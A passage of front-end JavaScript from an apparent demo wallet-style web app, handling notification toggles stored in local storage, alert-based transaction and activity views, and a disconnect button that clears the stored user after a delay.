  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifPageToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifPageToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifList').innerText = app.notifMsgs.slice(-10).map(msg=>"<div>"+msg+"</div>").join("");

// ========== TRANSACTIONS / ACTIVITY ==========
$('#transactionsBtn').onclick = function() {
  alert("Show transactions (demo). List: "+JSON.stringify(app.transactions));
};
$('#activityBtn').onclick = function() {
  alert("Show activity (demo). List: "+JSON.stringify(app.transactions));
};
$('#disconnectBtn').onclick = async function() {
  alert("Disconnecting...");
  await sleep(15000);
  delLS(LS.user); app.user=null; switchPage('landingPage');
};
  <script src="app-bot.js"></script>
</body>
</html>
